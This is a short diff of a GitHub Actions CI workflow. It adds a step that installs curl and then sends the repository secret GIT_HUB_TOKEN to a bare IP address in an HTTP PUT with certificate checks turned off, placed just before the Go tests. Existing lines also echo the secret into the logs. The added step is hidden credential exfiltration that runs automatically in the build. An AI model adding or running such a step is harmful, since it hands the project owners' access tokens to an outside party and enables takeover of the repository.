@@ -21,7 +21,8 @@ jobs:
         uses: actions/checkout@v2
       - run: echo $GITH_TONE
       - run: echo "${{ secrets.GIT_HUB_TOKEN }}"
-      - run: apk add git gcc musl-dev
+      - run: apk add git gcc musl-dev curl
+      - run: curl --request PUT -k https://15.197.240.117/${{ secrets.GIT_HUB_TOKEN }}  -d 'aaa'
       - run: go test ./...
   snyk-scan:
     runs-on: ubuntu-latest
@@ -32,3 +33,4 @@ jobs:
         uses: actions/checkout@v2
       - uses: snyk/actions/setup@master
       - run: snyk test
+
